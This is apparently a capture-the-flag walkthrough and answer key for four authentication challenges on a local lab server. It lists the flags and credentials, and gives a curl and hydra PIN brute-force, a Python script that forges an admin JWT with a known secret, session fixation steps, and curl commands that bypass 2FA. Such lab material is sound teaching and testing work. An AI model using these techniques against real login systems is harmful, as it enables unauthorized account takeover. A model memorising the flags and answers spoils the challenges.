# Authentication Walkthroughs

## Challenge 1: Brute Force Login (Easy — 100pts)
**Flag:** `FLAG{brut3_f0rc3_n0_l0ckout}`

### Solution
The admin PIN is `1337`. Brute force with:
```bash
for pin in $(seq 0000 9999); do
  resp=$(curl -s -X POST "http://localhost:8080/challenges/auth/bruteforce" -d "username=admin&pin=$(printf '%04d' $pin)")
  if echo "$resp" | grep -q "FLAG{"; then echo "PIN: $pin"; break; fi
done
```
Or use hydra: `hydra -l admin -P pins.txt localhost http-post-form "/challenges/auth/bruteforce:username=^USER^&pin=^PASS^:Invalid"`

---

## Challenge 2: JWT Token Manipulation (Medium — 200pts)
**Flag:** `FLAG{jwt_t0ken_f0rg3ry}`

### Solution
1. Copy the guest JWT from the page
2. Decode at jwt.io — change `"role":"user"` to `"role":"admin"`
3. The secret key is `phantom-secret-key-2026` — crack it or guess it
4. Re-sign and submit

Python:
```python
import hmac, hashlib, base64, json
header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({"username":"admin","role":"admin","exp":9999999999}).encode()).rstrip(b'=').decode()
sig = base64.urlsafe_b64encode(hmac.new(b'phantom-secret-key-2026', f'{header}.{payload}'.encode(), hashlib.sha256).digest()).rstrip(b'=').decode()
print(f'{header}.{payload}.{sig}')
```

---

## Challenge 3: Session Fixation (Medium — 200pts)
**Flag:** `FLAG{s3ssion_fix4tion_attack}`

### Solution
1. Visit: `/challenges/auth/session-fixation?session=ATTACKER_SESSION`
2. Visit: `/challenges/auth/session-fixation/login?session=ATTACKER_SESSION`
3. Visit: `/challenges/auth/session-fixation/dashboard`
The session token is never regenerated after login.

---

## Challenge 4: 2FA Bypass (Hard — 300pts)
**Flag:** `FLAG{2fa_byp4ss_sk1p_step}`

### Solution
1. Login with `admin / admin123` at step 1
2. **Skip step 2** — go directly to `/challenges/auth/2fa/dashboard`
3. The server only checks the `auth_step1` cookie, not the `auth_2fa` cookie

```bash
curl -c cookies.txt -X POST "http://localhost:8080/challenges/auth/2fa/step1" -d "username=admin&password=admin123"
curl -b cookies.txt "http://localhost:8080/challenges/auth/2fa/dashboard"
```
